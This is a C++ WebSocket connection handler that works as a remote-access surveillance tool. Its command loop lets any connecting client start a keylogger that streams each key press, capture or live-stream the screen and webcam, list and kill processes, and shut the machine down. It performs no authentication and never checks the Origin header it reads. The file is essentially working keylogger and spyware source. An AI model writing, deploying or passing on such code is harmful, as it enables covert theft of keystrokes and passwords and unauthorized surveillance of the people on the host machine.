#ifndef __websocket_connection_h__
#define __websocket_connection_h__

#include <chrono>
#include <iostream>
#include <thread>
#include <vector>
#include <memory>
#include <mutex>

#include "http.h"
#include "net/receiver.h"
#include "net/sender.h"
#include "net/tcp_socket.h"
#include "util/base64.h"
#include "util/sha1.h"

// Include API headers before class definition
#include "api/frame_capture.h"
#include "api/keyboard.h"
#include "api/process_manipulate.h"
#include "api/shutdown_machine.h"
#include "api/webcam.h"

static const string SECURITY_KEY_RESPONSE_FIELD = "Sec-WebSocket-Key:";
static const string ORIGIN_RESPONSE_FIELD = "Origin:";

class WebSocketConnection {
public:
  static string computeAcceptKey(const string &clientKey);
  explicit WebSocketConnection(int fd)
      : fd_(fd), handshaked_(false), streaming_(false), keylogger_active_(false) {
    sender_.setFd(fd);
    receiver_.setFd(fd);
  }
  void run();

private:
  int fd_;
  Sender sender_;
  Receiver receiver_;
  bool handshaked_;
  bool streaming_;
  bool keylogger_active_;
  std::unique_ptr<KeyboardListener> keyboard_;
  void performHandshake_();
  std::string getHttpRequest();
  void startWebcamStream_();
  void startScreenStream_();
};

std::string
WebSocketConnection::computeAcceptKey(const std::string &clientKey) {
  static const string GUID = "258EAFA5-E914-47DA-95CA-C5AB0DC85B11";
  std::string s = clientKey + GUID;

  SHA1 sha;
  sha.input(reinterpret_cast<const unsigned char *>(s.data()), s.size());

  unsigned char digest[20];
  sha.result(digest);

  return base64_encode(digest, 20);
}

void WebSocketConnection::run() {
  performHandshake_();

  // Mutex for thread-safe sending from keylogger callback
  std::mutex send_mutex;

  std::cout << "[WebSocket] Handshake done. Starting command loop.\n";
  while (true) {
    std::string msg;
    if (!receiver_.recvText(sender_, msg)) {
      std::cout << "[WebSocket] Client disconnected or error.\n";
      streaming_ = false;
      if (keyboard_) keyboard_->stop();
      break;
    }
    std::cout << "[WebSocket] Received: " << msg << "\n";

    if (msg == "shutdown") {
      sender_.sendText("Shutting down...");
      shutdown();
    } else if (msg == "start_keylogger") {
      if (keylogger_active_) {
        sender_.sendText("Keylogger already running");
      } else {
        keyboard_ = std::make_unique<KeyboardListener>();
        keyboard_->set_callback([this, &send_mutex](int code, int value, const char* name) {
          if (value == 1) { // Key press only
            std::lock_guard<std::mutex> lock(send_mutex);
            char buf[128];
            snprintf(buf, sizeof(buf), "KEY:%s (%d)", name, code);
            sender_.sendText(buf);
          }
        });
        if (keyboard_->start()) {
          keylogger_active_ = true;
          sender_.sendText("Keylogger started");
        } else {
          sender_.sendText("Failed to start keylogger (need root?)");
          keyboard_.reset();
        }
      }
    } else if (msg == "stop_keylogger") {
      if (keyboard_) {
        keyboard_->stop();
        keyboard_.reset();
      }
      keylogger_active_ = false;
      sender_.sendText("Keylogger stopped");
    } else if (msg == "list_process") {
      sender_.sendText(listProcesses());
    } else if (msg.rfind("kill_process:", 0) == 0) {
      // Format: kill_process:<pid>
      std::string pid_str = msg.substr(13);
      try {
        int pid = std::stoi(pid_str);
        int result = killProcess(pid);
        if (result == 0) {
          sender_.sendText("Process " + pid_str + " killed");
        } else {
          sender_.sendText("Failed to kill process " + pid_str);
        }
      } catch (...) {
        sender_.sendText("Invalid PID: " + pid_str);
      }
    } else if (msg == "frame_capture") {
      // Single screen capture
      int width, height;
      auto session = check_environment();
      sender_.sendBinary(capture_screen(session, width, height));
    } else if (msg == "capture_webcam") {
      // Send single webcam frame
      int width, height;
      sender_.sendBinary(capture_webcam_frame(0, width, height));
    } else if (msg == "start_stream" || msg == "start_webcam_stream") {
      // Webcam streaming (works reliably on all systems)
      streaming_ = true;
      sender_.sendText("Webcam stream started");
      startWebcamStream_();
    } else if (msg == "start_screen_stream") {
      // Screen streaming (may require permissions on GNOME Wayland)
      streaming_ = true;
      sender_.sendText("Screen stream started");
      startScreenStream_();
    } else if (msg == "stop_stream") {
      streaming_ = false;
      sender_.sendText("Stream stopped");
    } else {
      sender_.sendText("Unknown command: " + msg);
    }
  }
}

void WebSocketConnection::startWebcamStream_() {
  std::cout << "[WebSocket] Starting webcam stream at " << FRAME_RATE << " FPS\n";

  while (streaming_) {
    auto start = std::chrono::steady_clock::now();

    // Capture and send webcam frame
    int width, height;
    sender_.sendBinary(capture_webcam_frame(0, width, height));
    
    // Check for incoming messages (non-blocking)
    fd_set readfds;
    FD_ZERO(&readfds);
    FD_SET(fd_, &readfds);
    struct timeval tv = {0, 10000}; // 10ms timeout

    int select_result = select(fd_ + 1, &readfds, NULL, NULL, &tv);
    if (select_result > 0) {
      std::string msg;
      if (!receiver_.recvText(sender_, msg)) {
        streaming_ = false;
        break;
      }
      if (msg == "stop_stream") {
        streaming_ = false;
        sender_.sendText("Stream stopped");
        break;
      }
    }

    // Maintain frame rate
    auto end = std::chrono::steady_clock::now();
    auto elapsed = std::chrono::duration_cast<std::chrono::milliseconds>(end - start);
    int sleep_ms = (1000 / FRAME_RATE) - elapsed.count();
    if (sleep_ms > 0) {
      std::this_thread::sleep_for(std::chrono::milliseconds(sleep_ms));
    }
  }
  std::cout << "[WebSocket] Webcam stream stopped\n";
}

void WebSocketConnection::startScreenStream_() {
  std::cout << "[WebSocket] Starting screen stream at " << FRAME_RATE
            << " FPS\n";

  auto session = check_environment();
  while (streaming_) {
    auto start = std::chrono::steady_clock::now();

    // Capture and send screen frame
    int width, height;
    auto frame = capture_screen(session, width, height);
    if (frame.empty()) {
      std::cout << "[WebSocket] Screen capture returned empty frame\n";
    } else {
      std::cout << "[WebSocket] Screen captured: " << frame.size() << " bytes\n";
      sender_.sendBinary(frame);
    }
    
    // Check for incoming messages (non-blocking)
    fd_set readfds;
    FD_ZERO(&readfds);
    FD_SET(fd_, &readfds);
    struct timeval tv = {0, 10000}; // 10ms timeout

    int select_result = select(fd_ + 1, &readfds, NULL, NULL, &tv);
    if (select_result > 0) {
      std::string msg;
      if (!receiver_.recvText(sender_, msg)) {
        streaming_ = false; // Client disconnected
        break;
      }
      if (msg == "stop_stream") {
        streaming_ = false;
        sender_.sendText("Stream stopped");
        break;
      }
    }

    // Maintain frame rate
    auto end = std::chrono::steady_clock::now();
    auto elapsed =
        std::chrono::duration_cast<std::chrono::milliseconds>(end - start);
    int sleep_ms = (1000 / FRAME_RATE) - elapsed.count();
    if (sleep_ms > 0) {
      std::this_thread::sleep_for(std::chrono::milliseconds(sleep_ms));
    }
  }

  std::cout << "[WebSocket] Frame stream stopped\n";
}

void WebSocketConnection::performHandshake_() {
  HttpRequestParser parser(getHttpRequest());

  string browserSecurityKey = parser[SECURITY_KEY_RESPONSE_FIELD];
  string origin = parser[ORIGIN_RESPONSE_FIELD];
  string acceptValue = computeAcceptKey(browserSecurityKey);

  sender_.sendHandshake(acceptValue);
  handshaked_ = parser.getRequestLine().isCorrectWebsocketUpgradeRequest();
}

string WebSocketConnection::getHttpRequest() {
  string data;
  char buf[1024];
  while (data.find("\r\n\r\n") == std::string::npos) {
    ssize_t n = ::recv(fd_, buf, sizeof(buf), 0);
    if (n <= 0) {
      throw std::runtime_error("Client closed before handshake");
    }
    data.append(buf, buf + n);
  }
  std::cout << data << '\n';
  return data;
}

#endif
